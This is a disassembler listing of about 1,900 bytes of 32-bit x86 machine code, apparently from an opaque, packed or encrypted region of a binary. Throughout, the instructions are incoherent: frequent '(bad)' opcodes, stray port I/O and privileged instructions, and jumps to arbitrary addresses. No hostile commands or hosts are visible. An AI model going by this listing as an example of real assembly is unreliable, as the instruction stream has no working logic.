  421669:	mov    ds:0x8e1efb6,al
  42166e:	arpl   WORD PTR [ebx-0xfa71f4f],bx
  421674:	push   ss
  421675:	arpl   WORD PTR [eax-0x66d258d8],bp
  42167b:	inc    ebp
  42167c:	bnd ss js 0x421602
  421680:	sbb    DWORD PTR [ebp-0x26],0xf
  421684:	dec    esp
  421685:	out    dx,eax
  421686:	jo     0x4216b0
  421688:	stc    
  421689:	cmc    
  42168a:	pushf  
  42168b:	sub    DWORD PTR [edi],ebx
  42168d:	mov    ds:0x731bda7c,al
  421692:	and    BYTE PTR [edx+ebp*4+0x6456ce41],0xdf
  42169a:	dec    edx
  42169b:	das    
  42169c:	adc    eax,0x7
  42169f:	add    esp,edi
  4216a1:	or     DWORD PTR ds:0x67813f18,esi
  4216a7:	hlt    
  4216a8:	repz iret 
  4216aa:	fbld   TBYTE PTR [eax+0x30]
  4216ad:	pushf  
  4216ae:	cmp    eax,0xe4289e0e
  4216b3:	(bad)  
  4216b4:	call   0x69dc:0x64f9fad1
  4216bb:	rol    esi,cl
  4216bd:	mov    ch,0x5b
  4216bf:	mov    ch,0x51
  4216c1:	in     eax,dx
  4216c2:	jbe    0x4216f8
  4216c4:	cmp    DWORD PTR [ebx-0x69],edi
  4216c7:	out    dx,al
  4216c8:	mov    DWORD PTR [edx+0x39d41ac2],esi
  4216ce:	imul   ebx,DWORD PTR gs:[ebp+0x5b],0xffffff95
  4216d3:	loop   0x4216c0
  4216d5:	dec    esp
  4216d6:	sbb    BYTE PTR [ebp-0x50],bl
  4216d9:	adc    BYTE PTR [eax-0x7b24d3e7],bl
  4216df:	xchg   esi,eax
  4216e0:	in     al,dx
  4216e1:	loopne 0x4216b3
  4216e3:	lea    esi,[eax-0x73902d63]
  4216e9:	xchg   ebx,eax
  4216ea:	and    al,0xf1
  4216ec:	fwait
  4216ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216ee:	addr16 jo 0x42169d
  4216f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216f3:	ret    
  4216f4:	call   0xb848635a
  4216f9:	cmp    eax,0x527c37b2
  4216fe:	mov    ebx,DWORD PTR [ecx+0x6e]
  421701:	mov    al,ds:0x86b4f5d9
  421706:	test   DWORD PTR [ebp-0x73],esi
  421709:	in     eax,dx
  42170a:	sub    ebp,ebx
  42170c:	loop   0x421734
  42170e:	aad    0x9a
  421710:	jge    0x421727
  421712:	jmp    0x4216d5
  421714:	int3   
  421715:	push   esi
  421716:	sbb    bl,BYTE PTR [esi-0x5c]
  421719:	inc    esp
  42171a:	xchg   ebx,eax
  42171b:	jle    0x4216f8
  42171d:	mov    ebp,0x491a37c1
  421722:	push   edi
  421723:	inc    eax
  421724:	(bad)  
  421725:	repz mov edi,0xbde019ce
  42172b:	fld    TBYTE PTR [edi-0x14]
  42172e:	xor    ebx,edx
  421730:	lahf   
  421731:	mov    dl,0x9c
  421733:	lock xchg ecx,eax
  421735:	push   esi
  421736:	pop    es
  421737:	lock mov DWORD PTR [eax+0x2c],eax
  42173b:	loope  0x4217a2
  42173d:	push   0x66
  42173f:	mul    DWORD PTR [edx+0x1243efea]
  421745:	push   esi
  421746:	lock test DWORD PTR [edx-0x30261f01],eax
  42174d:	jge    0x42170b
  42174f:	xlat   BYTE PTR ds:[ebx]
  421750:	sbb    BYTE PTR [esi],0x62
  421753:	mov    eax,0x7e323fbe
  421758:	lods   eax,DWORD PTR ds:[esi]
  421759:	les    ebp,FWORD PTR [eax]
  42175b:	add    eax,0x7ec81a9e
  421760:	mov    ds:0x349cf25c,eax
  421766:	in     eax,dx
  421767:	xchg   ebx,eax
  421768:	stos   DWORD PTR es:[edi],eax
  421769:	add    BYTE PTR [esi-0x4e7112a8],cl
  42176f:	ja     0x421788
  421771:	sub    BYTE PTR [ebp+0x19],dl
  421774:	test   DWORD PTR [ecx-0x59],0x4889951b
  42177b:	add    al,ch
  42177d:	or     ebp,0xffffff88
  421780:	outs   dx,BYTE PTR ds:[esi]
  421781:	cld    
  421782:	int3   
  421783:	les    edi,FWORD PTR es:[edi+0x0]
  421787:	dec    ebx
  421788:	les    eax,FWORD PTR [eax-0x7d6ece31]
  42178e:	and    ebx,0x25f2cb
  421794:	test   al,0xdf
  421796:	pop    ebp
  421797:	push   edx
  421798:	add    al,BYTE PTR [ecx]
  42179a:	loop   0x421800
  42179c:	into   
  42179d:	mov    esi,ds
  42179f:	xchg   DWORD PTR [ecx],edx
  4217a1:	inc    eax
  4217a2:	adc    ebp,DWORD PTR [esi+0x73130659]
  4217a8:	pop    ecx
  4217a9:	lods   al,BYTE PTR ds:[esi]
  4217aa:	push   ebp
  4217ab:	mov    ds:0x76da6ec4,eax
  4217b0:	cmc    
  4217b1:	inc    eax
  4217b2:	stc    
  4217b3:	dec    esi
  4217b4:	push   edi
  4217b5:	adc    BYTE PTR [ecx],ch
  4217b7:	test   eax,0x7deace44
  4217bc:	inc    edi
  4217bd:	add    ecx,DWORD PTR [eax+0x5f97592d]
  4217c3:	call   0x4a3d17a9
  4217c8:	dec    ebx
  4217c9:	stos   DWORD PTR es:[edi],eax
  4217ca:	adc    dl,BYTE PTR [esi+0x1]
  4217cd:	inc    edi
  4217ce:	(bad)  
  4217cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217d0:	mov    ch,0xe4
  4217d2:	jmp    0x421793
  4217d4:	ins    BYTE PTR es:[edi],dx
  4217d5:	sub    DWORD PTR [ebx-0x33f18ca9],ecx
  4217db:	lock mov al,0x9c
  4217de:	(bad)  
  4217df:	fldenv [ebp-0x53eb0d11]
  4217e5:	icebp  
  4217e6:	out    dx,eax
  4217e7:	adc    al,0x2f
  4217e9:	add    ebx,DWORD PTR [edx+ecx*1-0x2513325f]
  4217f0:	shr    BYTE PTR [ebp-0x673304c5],1
  4217f6:	cli    
  4217f7:	aas    
  4217f8:	jp     0x421831
  4217fa:	jns    0x42187b
  4217fc:	jns    0x4217c0
  4217fe:	inc    esi
  4217ff:	push   es
  421800:	adc    ebp,ecx
  421802:	xor    BYTE PTR [esi-0x41],0x2e
  421806:	fst    DWORD PTR [eax-0x56]
  421809:	(bad)  
  42180b:	lods   al,BYTE PTR ds:[esi]
  42180c:	clc    
  42180d:	test   ch,ah
  42180f:	jmp    0x44d5bec
  421814:	aaa    
  421815:	loope  0x421859
  421817:	pop    ebx
  421818:	enter  0x7f56,0xd5
  42181c:	inc    ebp
  42181d:	imul   ecx,DWORD PTR ds:0x3e5348fd,0xffffff9f
  421824:	and    dh,BYTE PTR [edx+esi*2+0x40956c19]
  42182b:	data16 jp 0x421832
  42182e:	fidiv  WORD PTR [edi+0x7b89fb49]
  421834:	pop    esp
  421835:	jp     0x4218a3
  421837:	cli    
  421838:	gs int 0xb3
  42183b:	aaa    
  42183c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42183d:	cs out dx,eax
  42183f:	pop    esi
  421840:	(bad)  
  421841:	adc    al,0x80
  421843:	rol    BYTE PTR [ebx+0x5b],0xf6
  421847:	leave  
  421848:	ret    0x85ae
  42184b:	add    ecx,DWORD PTR [ebp+0x32f966bb]
  421851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421852:	xor    DWORD PTR [ebx],ebx
  421854:	rcr    BYTE PTR [ebp+0xd581cb],0x42
  42185b:	mov    bl,0x39
  42185d:	out    0xc8,al
  42185f:	repnz pop esi
  421861:	jne    0x4218bc
  421863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421864:	jmp    0x2eb01f6c
  421869:	out    dx,eax
  42186a:	shl    DWORD PTR [ecx],0xb9
  42186d:	sbb    eax,0x9ebdb93c
  421872:	stc    
  421873:	fldenv [eax+eax*1+0x1e]
  421877:	data16 mov BYTE PTR [esi-0x5705f4d3],dh
  42187e:	adc    cl,BYTE PTR [ecx-0x59]
  421881:	scas   eax,DWORD PTR es:[edi]
  421882:	push   0x15122aeb
  421887:	test   al,0x59
  421889:	and    esp,ebx
  42188b:	sub    ecx,eax
  42188d:	ficom  WORD PTR [edi+0x91e411b]
  421893:	pop    ebp
  421894:	das    
  421895:	jo     0x4218d4
  421897:	push   ds
  421898:	cld    
  421899:	fdivr  QWORD PTR [ecx+0x56]
  42189c:	jbe    0x42189d
  42189e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42189f:	das    
  4218a0:	xchg   ecx,eax
  4218a1:	ds jl  0x421857
  4218a4:	cmp    BYTE PTR [ecx+0x2845d738],dl
  4218aa:	cdq    
  4218ab:	ins    DWORD PTR es:[edi],dx
  4218ac:	out    dx,eax
  4218ad:	ret    
  4218ae:	and    DWORD PTR [ecx],esi
  4218b0:	mov    ch,0x5a
  4218b2:	ffree  st(3)
  4218b4:	adc    eax,0x7e6ba719
  4218b9:	loope  0x42189b
  4218bb:	mov    eax,0x85d41b2d
  4218c0:	imul   esp,DWORD PTR [esi-0x2e8e091],0x3a
  4218c7:	ss push 0xc71137a2
  4218cd:	inc    edx
  4218ce:	fcomp  st(2)
  4218d0:	push   ecx
  4218d1:	popf   
  4218d2:	retf   0x1df6
  4218d5:	jg     0x421949
  4218d7:	in     eax,0x6a
  4218d9:	rcr    al,cl
  4218db:	add    esi,DWORD PTR [eax-0x7c]
  4218de:	aaa    
  4218df:	test   dl,0xd8
  4218e2:	or     DWORD PTR [esi-0x18a3d9de],ebx
  4218e8:	jge    0x4218b0
  4218ea:	jecxz  0x42195c
  4218ec:	mov    cl,0x3b
  4218ee:	jo     0x4218ec
  4218f0:	mov    esi,0xd91f3cb6
  4218f5:	xor    edi,edi
  4218f7:	mov    di,0x3dab
  4218fb:	scas   eax,DWORD PTR es:[edi]
  4218fc:	push   esp
  4218fd:	inc    edx
  4218fe:	iret   
  4218ff:	push   esp
  421900:	or     ch,BYTE PTR [edx+esi*4-0x67]
  421904:	push   edx
  421905:	cwde   
  421906:	std    
  421907:	lahf   
  421908:	retf   
  421909:	cwde   
  42190a:	push   cs
  42190b:	jbe    0x4218b1
  42190d:	sahf   
  42190e:	clc    
  42190f:	iret   
  421910:	jmp    0x4218e8
  421912:	xchg   edx,eax
  421913:	jmp    0x8211234
  421918:	sti    
  421919:	(bad)  
  42191b:	mov    ebp,0x5c6e6f99
  421920:	ins    DWORD PTR es:[edi],dx
  421921:	ss jo  0x421919
  421924:	xchg   esi,eax
  421925:	fild   DWORD PTR [ecx+ecx*2+0x75294890]
  42192c:	push   ss
  42192d:	outs   dx,DWORD PTR ds:[esi]
  42192e:	inc    ecx
  42192f:	or     eax,DWORD PTR [eax-0x27]
  421932:	jbe    0x421947
  421934:	fwait
  421935:	pop    es
  421936:	sub    bl,BYTE PTR [esi]
  421938:	aas    
  421939:	retf   0xa756
  42193c:	pop    es
  42193d:	xchg   edi,eax
  42193e:	enter  0x195e,0x95
  421942:	in     al,dx
  421943:	sub    bl,BYTE PTR [ebp-0x3d6b121f]
  421949:	cmp    DWORD PTR [esi],esi
  42194b:	mov    dh,0xdd
  42194d:	mov    DWORD PTR [edx-0x3a],eax
  421950:	(bad)  [edi+0x66c0b140]
  421956:	xor    al,0xc8
  421958:	cli    
  421959:	inc    ecx
  42195a:	ror    BYTE PTR [ebp+0x61],cl
  42195d:	inc    ebx
  42195e:	or     al,0xa2
  421960:	pop    ebp
  421961:	mov    dh,0xcd
  421963:	xchg   edx,eax
  421964:	dec    edx
  421965:	loope  0x4219a7
  421967:	test   al,dl
  421969:	mov    ch,0x8a
  42196b:	wbinvd 
  42196d:	stos   BYTE PTR es:[edi],al
  42196e:	loope  0x4219bc
  421970:	imul   esp,DWORD PTR [edi+0x2a],0x5d
  421974:	leave  
  421975:	loop   0x42195e
  421977:	xchg   esp,eax
  421978:	sbb    BYTE PTR [ecx-0x24],dl
  42197b:	push   ecx
  42197c:	jge    0x42197f
  42197e:	out    0x16,eax
  421980:	sub    BYTE PTR [edx+eax*4+0x6b6ef818],bl
  421987:	lods   al,BYTE PTR ds:[esi]
  421988:	and    cl,BYTE PTR [esi+0x47]
  42198b:	shr    DWORD PTR [edi+eax*8+0x20],0x13
  421990:	jb     0x4219be
  421992:	mov    dl,0x26
  421994:	jle    0x1841bc9a
  42199a:	inc    ecx
  42199b:	ffreep st(5)
  42199d:	cmc    
  42199e:	jmp    esp
  4219a0:	add    dh,BYTE PTR [eax-0x26]
  4219a3:	inc    ebp
  4219a4:	xor    ebp,DWORD PTR [ebx-0x7950860d]
  4219aa:	or     eax,0x503daa3e
  4219af:	jg     0x4219e9
  4219b1:	pushf  
  4219b2:	mov    ch,0xc6
  4219b4:	add    eax,0x1e68724
  4219b9:	fdiv   DWORD PTR [esi-0x26454330]
  4219bf:	pop    ss
  4219c0:	inc    edx
  4219c1:	sub    BYTE PTR [edx],0x15
  4219c4:	leave  
  4219c5:	push   edi
  4219c6:	adc    al,0xbd
  4219c8:	imul   ebx,DWORD PTR [ebx+0x636087dd],0x33d973ce
  4219d2:	icebp  
  4219d3:	fiadd  DWORD PTR [ebp+0xf]
  4219d6:	adc    al,0xee
  4219d8:	imul   ecx,esi,0x16
  4219db:	ret    0x36e4
  4219de:	mov    ah,0x71
  4219e0:	xchg   ebp,eax
  4219e1:	aas    
  4219e2:	rcl    DWORD PTR [ebx+0xef0a075],cl
  4219e8:	jo     0x421a38
  4219ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219eb:	pop    ebp
  4219ec:	stos   DWORD PTR es:[edi],eax
  4219ed:	sbb    al,0x63
  4219ef:	adc    DWORD PTR fs:[ebp+0x75ed653a],ecx
  4219f6:	add    eax,0x1c332b38
  4219fb:	outs   dx,BYTE PTR ds:[esi]
  4219fc:	sub    dh,bh
  4219fe:	jns    0x4219f8
  421a00:	pop    es
  421a01:	dec    edx
  421a02:	add    eax,0x39750f39
  421a07:	rol    DWORD PTR [ecx+edi*1+0x67],1
  421a0b:	sbb    BYTE PTR [ebx+0x745d024],bh
  421a11:	gs and al,0xb6
  421a14:	jne    0x421a55
  421a16:	xchg   ecx,eax
  421a17:	test   BYTE PTR [edx+0x39],bh
  421a1a:	mov    WORD PTR [ebp+0x363bff37],ds
  421a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a21:	cmp    esi,esi
  421a23:	sbb    DWORD PTR [esi],0x6987349
  421a29:	inc    ebp
  421a2a:	sub    bh,BYTE PTR [eax+0x4f337c78]
  421a30:	mov    cl,0xf3
  421a32:	rcr    BYTE PTR [ebx+0x28704548],1
  421a38:	adc    BYTE PTR [eax-0x4b6dffe0],ch
  421a3e:	push   ecx
  421a3f:	jb     0x421a4e
  421a41:	xlat   BYTE PTR ds:[ebx]
  421a42:	pop    ss
  421a43:	dec    ebp
  421a44:	test   al,0xa9
  421a46:	sahf   
  421a47:	loopne 0x421a83
  421a49:	xlat   BYTE PTR ds:[ebx]
  421a4a:	inc    ebx
  421a4b:	jle    0x421a53
  421a4d:	fld    QWORD PTR [eax-0x4c]
  421a50:	or     dl,BYTE PTR [ecx]
  421a52:	and    eax,0x56eb79e
  421a57:	or     DWORD PTR [edi-0x24],esi
  421a5a:	inc    ecx
  421a5b:	push   ds
  421a5c:	(bad)  
  421a5d:	cmp    DWORD PTR [edx+0x5c049a1c],ebp
  421a63:	mov    ch,0xf9
  421a65:	js     0x421a9d
  421a67:	push   ss
  421a68:	iret   
  421a69:	loopne 0x4219fb
  421a6b:	aad    0x10
  421a6d:	cmp    ah,BYTE PTR [edi+0x63f7acd9]
  421a73:	mov    esi,0x79f5b433
  421a78:	jne    0x421a4e
  421a7a:	push   ss
  421a7b:	xchg   esp,eax
  421a7c:	data16 das 
  421a7e:	dec    esp
  421a7f:	mov    ah,0x8d
  421a81:	mov    ah,0x83
  421a83:	inc    DWORD PTR [ebp-0xb34ee59]
  421a89:	enter  0x2e3b,0x59
  421a8d:	and    esp,DWORD PTR [esp+edi*4+0x17]
  421a91:	in     al,0x35
  421a93:	xor    BYTE PTR [ebp+0x3362814a],ah
  421a99:	cmp    bh,BYTE PTR [edx]
  421a9b:	push   0xffffffca
  421a9d:	icebp  
  421a9e:	jecxz  0x421acb
  421aa0:	repnz shr DWORD PTR [ebx-0x68dca796],0xd4
  421aa8:	xor    al,0xa3
  421aaa:	aam    0xea
  421aac:	sub    BYTE PTR [eax+0x3d],ch
  421aaf:	cmc    
  421ab0:	je     0x421a60
  421ab2:	retf   
  421ab3:	add    al,0x9c
  421ab5:	sub    DWORD PTR ds:0x77a4d607,esp
  421abb:	(bad)  
  421abc:	mov    bh,0xc6
  421abe:	push   ecx
  421abf:	inc    esi
  421ac0:	into   
  421ac1:	push   esp
  421ac2:	mov    dl,0xaa
  421ac4:	jmp    0xae8a:0x652b9397
  421acb:	jmp    0x421b28
  421acd:	xor    ebx,ebp
  421acf:	push   eax
  421ad0:	cli    
  421ad1:	nop
  421ad2:	push   es
  421ad3:	mov    eax,ds:0xa05ca1a6
  421ad8:	mov    ebp,0x5c89cb69
  421add:	push   ecx
  421ade:	sub    cl,BYTE PTR [ebx+ebp*2]
  421ae1:	pop    ss
  421ae2:	dec    ecx
  421ae3:	add    esi,eax
  421ae5:	fsubr  st,st(1)
  421ae7:	xor    dl,bl
  421ae9:	outs   dx,BYTE PTR ds:[esi]
  421aea:	ja     0x421b19
  421aec:	stos   BYTE PTR es:[edi],al
  421aed:	adc    cl,ah
  421aef:	test   edx,0xb19f3473
  421af5:	mov    ch,0x58
  421af7:	pop    edi
  421af8:	sbb    DWORD PTR [edi],esp
  421afa:	xchg   esp,eax
  421afb:	mov    eax,ds:0x647dd5bb
  421b00:	fld    QWORD PTR [ebx-0x63]
  421b03:	jmp    0x84041d10
  421b08:	out    dx,eax
  421b09:	in     eax,dx
  421b0a:	xor    esi,esi
  421b0c:	mov    esi,0x7f10b449
  421b11:	dec    edi
  421b12:	call   0x19d33688
  421b17:	das    
  421b18:	rol    DWORD PTR [eax+0x11],1
  421b1b:	daa    
  421b1c:	fistp  DWORD PTR [edi+0x6434b94f]
  421b22:	sub    al,0x82
  421b24:	dec    esi
  421b25:	dec    eax
  421b26:	mov    BYTE PTR [edx+0x5d],ah
  421b29:	sahf   
  421b2a:	fisttp WORD PTR [ebp+0x7e1a3c2]
  421b30:	lods   eax,DWORD PTR ds:[esi]
  421b31:	loopne 0x421b7b
  421b33:	data16 (bad) 
  421b38:	mov    eax,ds:0x42c7a419
  421b3d:	stos   DWORD PTR es:[edi],eax
  421b3e:	add    bl,BYTE PTR [ebp+0x1c3150fd]
  421b44:	dec    esi
  421b45:	in     al,0xa9
  421b47:	push   0xffffffcc
  421b49:	inc    esi
  421b4a:	cmp    ecx,edi
  421b4c:	mov    bh,0x83
  421b4e:	jns    0x421b13
  421b50:	loope  0x421b75
  421b52:	es adc eax,0x4b80fb57
  421b58:	fld    DWORD PTR [edi+ebp*8+0x28739b0f]
  421b5f:	out    dx,eax
  421b60:	sahf   
  421b61:	sub    ebx,edi
  421b63:	(bad)
  421b67:	arpl   WORD PTR [esi-0x3],ax
  421b6a:	dec    ebx
  421b6b:	gs add al,0x28
  421b6e:	loopne 0x421b1b
  421b70:	inc    DWORD PTR [edi]
  421b72:	jmp    0xe5ff:0x8c470b36
  421b79:	mov    esi,0x4dc00bd5
  421b7e:	imul   ebp,DWORD PTR [eax+ebp*4-0x7cea2134],0x7a2a5917
  421b89:	jmp    0xbff31474
  421b8e:	lahf   
  421b8f:	xchg   ecx,eax
  421b90:	jne    0x421b9d
  421b92:	jle    0x421b61
  421b94:	dec    esp
  421b95:	jp     0x421b2c
  421b97:	xchg   ecx,eax
  421b98:	mov    BYTE PTR [edx-0x76],al
  421b9b:	pop    ebx
  421b9c:	push   ds
  421b9d:	jne    0x421b33
  421b9f:	or     cl,bh
  421ba1:	jecxz  0x421bba
  421ba3:	add    al,0xe8
  421ba5:	mov    dl,0xa
  421ba7:	shl    cl,cl
  421ba9:	loop   0x421bdf
  421bab:	mov    BYTE PTR [edx],cl
  421bad:	inc    edx
  421bae:	pop    eax
  421baf:	push   es
  421bb0:	lahf   
  421bb1:	enter  0x4c1d,0xf3
  421bb5:	mov    ebp,DWORD PTR [ebp+0x27]
  421bb8:	dec    ecx
  421bb9:	lock jmp 0x421c2a
  421bbc:	sti    
  421bbd:	jns    0x421bdc
  421bbf:	mov    ebp,eax
  421bc1:	les    eax,FWORD PTR [esp+edx*1+0x2d]
  421bc5:	test   eax,0x8f57ef5c
  421bca:	and    ebp,DWORD PTR [esi]
  421bcc:	js     0x421b65
  421bce:	jle    0x421b7e
  421bd0:	or     DWORD PTR [esi-0x3d6c55fb],ecx
  421bd6:	lock popa 
  421bd8:	icebp  
  421bd9:	adc    DWORD PTR [ebp+0x25],ebx
  421bdc:	push   ss
  421bdd:	ins    BYTE PTR es:[edi],dx
  421bde:	adc    al,0x65
  421be0:	mov    ecx,0x8c04c743
  421be5:	ds js  0x421c4b
  421be8:	add    esp,ebx
  421bea:	pop    ebp
  421beb:	cmp    ch,dl
  421bed:	ja     0x421c46
  421bef:	retf   0x64a0
  421bf2:	pusha  
  421bf3:	dec    esi
  421bf4:	pop    ecx
  421bf5:	inc    edi
  421bf6:	push   0x361250f3
  421bfb:	pop    ss
  421bfc:	adc    dh,BYTE PTR [ebx-0x45]
  421bff:	scas   al,BYTE PTR es:[edi]
  421c00:	test   BYTE PTR [edx],0xd7
  421c03:	push   edi
  421c04:	add    BYTE PTR [eax],al
  421c06:	add    BYTE PTR [eax],al
  421c08:	add    BYTE PTR [eax],al
  421c0a:	push   esi
  421c0b:	inc    ebx
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx-0x575e168e]
  421c18:	aad    0x90
  421c1a:	fisubr WORD PTR [edx+0x6820001]
  421c20:	add    BYTE PTR [eax],al
  421c22:	pop    ebp
  421c23:	stc    
  421c24:	push   0xffffff84
  421c26:	cmp    ebx,esp
  421c28:	xchg   edi,eax
  421c29:	inc    ecx
  421c2a:	adc    ecx,DWORD PTR [ebx+0x7d]
  421c2d:	sub    eax,DWORD PTR [ebx]
  421c2f:	push   edi
  421c30:	call   0x7e8d:0x8f299fb0
  421c37:	xchg   edx,eax
  421c38:	ins    BYTE PTR es:[edi],dx
  421c39:	loope  0x421bdc
  421c3b:	cli    
  421c3c:	imul   esi,DWORD PTR [esi-0x70356205],0x0
  421c43:	inc    ecx
  421c44:	and    ah,BYTE PTR [ebp-0xb]
  421c47:	jle    0x421c60
  421c49:	xor    bl,cl
  421c4b:	les    esi,FWORD PTR [edx+0x48]
  421c4e:	fnop   
  421c50:	ret    
  421c51:	or     eax,DWORD PTR [edi-0x18]
  421c54:	into   
  421c55:	push   ss
  421c56:	xchg   ebp,eax
  421c57:	dec    ecx
  421c58:	dec    ebx
  421c59:	aad    0xbb
  421c5b:	jns    0x421c5a
  421c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c5e:	jecxz  0x421c88
  421c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c61:	jecxz  0x421c6c
  421c63:	xor    al,0xc9
  421c65:	add    al,0x3
  421c67:	mov    bl,0x6
  421c69:	mov    BYTE PTR [eax-0x4c6c448a],bl
  421c6f:	xor    dl,BYTE PTR [ecx+0x20]
  421c72:	outs   dx,DWORD PTR ds:[esi]
  421c73:	push   ebx
  421c74:	mov    ds:0x337f8825,eax
  421c79:	mov    edi,DWORD PTR [edx-0x60]
  421c7c:	push   0x22253a02
  421c81:	and    eax,0x4453ad60
  421c86:	(bad)  
  421c87:	js     0x421c93
  421c89:	dec    edx
  421c8a:	jno    0x421cb2
  421c8c:	add    DWORD PTR [edx-0x1c64e8ad],ebp
  421c92:	test   DWORD PTR [esi-0x6b792ce4],0x2bbc5a84
  421c9c:	and    al,0xaf
  421c9e:	cmp    eax,0xa9e3b97
  421ca3:	push   ebp
  421ca4:	push   ss
  421ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ca6:	jecxz  0x421ce3
  421ca8:	ret    0xe162
  421cab:	xchg   DWORD PTR [esi+0x5a],esi
  421cae:	ret    0x4ff3
  421cb1:	and    dl,0xca
  421cb4:	shl    cl,cl
  421cb6:	pop    ebp
  421cb7:	mov    gs,ecx
  421cb9:	in     eax,dx
  421cba:	scas   al,BYTE PTR es:[edi]
  421cbb:	test   al,0xc9
  421cbd:	js     0x421c4a
  421cbf:	cmp    ebx,edx
  421cc1:	xor    ecx,DWORD PTR [edx]
  421cc3:	fistp  QWORD PTR [ebx]
  421cc5:	xor    eax,0x1fcad553
  421cca:	inc    eax
  421ccb:	adc    esp,DWORD PTR [ebx+0x16]
  421cce:	add    eax,0xf6e896a9
  421cd3:	mov    eax,ds:0xb50c6a96
  421cd8:	mov    cl,0x96
  421cda:	dec    ecx
  421cdb:	fld    DWORD PTR [edi]
  421cdd:	jnp    0x421c95
  421cdf:	das    
  421ce0:	cmp    eax,0xec011e15
  421ce5:	retf   0x80e2
  421ce8:	or     DWORD PTR [edx],edx
  421cea:	in     eax,dx
  421ceb:	dec    esi
  421cec:	push   ds
  421ced:	dec    esi
  421cee:	lahf   
  421cef:	mov    ebx,0xe622aad8
  421cf4:	lock (bad) 
  421cf6:	mov    esp,edx
  421cf8:	jnp    0x421c88
  421cfa:	call   0x33198a5e
  421cff:	sub    al,0xbe
  421d01:	pop    edx
  421d02:	(bad)  
  421d03:	fcomp  DWORD PTR [edx-0x15]
  421d06:	xchg   edx,esp
  421d08:	adc    eax,0xa49ba912
  421d0d:	adc    BYTE PTR [ecx],al
  421d0f:	mov    esp,0x9aff932
  421d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d15:	es call 0xd7596373
  421d1b:	sbb    bh,BYTE PTR [eax-0x2e]
  421d1e:	or     ch,cl
  421d20:	int3   
  421d21:	cmc    
  421d22:	sub    DWORD PTR [edx+0x7],0xffffffe1
  421d26:	imul   eax,DWORD PTR ds:0x7a7bae82,0x73
  421d2d:	(bad)  
  421d2e:	ror    DWORD PTR [edx],1
  421d30:	pop    esp
  421d31:	jl     0x421d90
  421d33:	xor    ch,BYTE PTR ds:0x72780159
  421d39:	pop    esi
  421d3a:	push   ecx
  421d3b:	loope  0x421d54
  421d3d:	mov    ecx,esi
  421d3f:	pop    es
  421d40:	test   BYTE PTR [edi+0x41],0xb3
  421d44:	jl     0x421cf3
  421d46:	std    
  421d47:	xchg   ecx,eax
  421d48:	outs   dx,BYTE PTR ds:[esi]
  421d49:	sub    dl,BYTE PTR [ecx+0x5085ccae]
  421d4f:	bound  esp,QWORD PTR [ebp+0x26d2a8cf]
  421d55:	cwde   
  421d56:	jge    0x421dae
  421d58:	cld    
  421d59:	inc    esp
  421d5a:	pusha  
  421d5b:	xchg   ebp,eax
  421d5c:	call   0xa8b325f4
  421d61:	mov    ds:0x7435ca83,al
  421d66:	xlat   BYTE PTR ds:[ebx]
  421d67:	pop    esi
  421d68:	pmaddwd mm4,QWORD PTR [ebp-0x525d05a]
  421d6f:	mov    edx,eax
  421d71:	(bad)  
  421d72:	fist   DWORD PTR [ebx+0x35]
  421d75:	and    edx,esp
  421d77:	rcl    DWORD PTR [eax-0x7c],cl
  421d7a:	ret    
  421d7b:	dec    ebx
  421d7c:	inc    edi
  421d7d:	inc    ebx
  421d7e:	lods   al,BYTE PTR ds:[esi]
  421d7f:	sbb    ch,bl
  421d81:	add    BYTE PTR [esi],dh
  421d83:	add    BYTE PTR [edx],cl
  421d85:	lods   al,BYTE PTR gs:[esi]
  421d87:	fisttp WORD PTR [edi+0x3c365345]
  421d8d:	out    0x6e,al
  421d8f:	lods   al,BYTE PTR ds:[esi]
  421d90:	xchg   DWORD PTR [edx-0x5a41bcf8],esi
  421d96:	in     eax,dx
  421d97:	test   DWORD PTR [ecx+esi*4],edx
  421d9a:	in     eax,dx
  421d9b:	adc    bh,BYTE PTR [edi+0x3eb94f51]
  421da1:	fidiv  WORD PTR ds:0x7df66282
  421da7:	fcom   QWORD PTR [ecx]
  421da9:	and    bl,bl
  421dab:	test   eax,edi
  421dad:	es lock loope 0x421d6d
  421db1:	xor    ah,BYTE PTR [edi-0xd]
  421db4:	jl     0x421dc4
  421db6:	popf   
  421db7:	mov    DWORD PTR [edi+0x4a],edi
  421dba:	sbb    eax,0xf88ab7af
  421dbf:	lods   al,BYTE PTR ds:[esi]
  421dc0:	js     0x421d73
  421dc2:	pop    esi
  421dc3:	imul   edi,DWORD PTR [ebx],0x7bafb297
  421dc9:	cli    
  421dca:	sub    al,0x3c
  421dcc:	sti    
  421dcd:	pop    ebx
  421dce:	sub    DWORD PTR [edx],eax
  421dd0:	mov    ds:0xf3b1b4e0,eax
  421dd5:	and    eax,0x1d89006
  421dda:	test   BYTE PTR [esi+0x30],0xe2
  421dde:	xchg   edx,eax
  421ddf:	mov    edx,?
  421de1:	jnp    0x421dce
  421de3:	addr16 cwde 
  421de5:	cli    
  421de6:	push   ebp
  421de7:	push   ss
  421de8:	mov    sp,0x4165
  421dec:	sti    
  421ded:	xchg   ebp,eax
  421dee:	cmp    eax,DWORD PTR [esi]
  421df0:	inc    edi
  421df1:	jmp    0xc1d57b62
  421df6:	sbb    eax,0x4f64e542
  421dfb:	(bad)  
  421dfc:	push   esp
  421dfd:	mov    dl,0xb1
  421dff:	loop   0x421e27
  421e01:	mov    BYTE PTR [eax-0x65],bl
  421e04:	sub    edi,DWORD PTR [eax+esi*2]
  421e07:	sbb    esi,DWORD PTR [ecx+0x5721fc2b]
  421e0d:	lods   al,BYTE PTR ds:[esi]
